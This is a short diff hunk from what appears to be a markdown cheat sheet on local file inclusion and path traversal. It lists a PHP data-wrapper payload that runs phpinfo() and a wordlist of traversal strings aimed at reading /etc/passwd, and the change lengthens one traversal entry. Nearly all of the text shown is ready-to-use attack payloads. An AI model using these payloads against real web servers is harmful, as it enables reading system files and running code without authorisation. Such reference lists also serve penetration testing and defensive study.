@@ -23,7 +23,7 @@ ___
 8. Using Data wrappers >> data:text/plain,<?php%20phpinfo();%20?>
 #### Wordlist
 ```txt
-../../../etc/passwd
+../../../../../../../etc/passwd
 ..//..//..//..//etc/passwd
 ....//....//....//....//etc/passwd
 /var/www/images/../../../etc/passwd
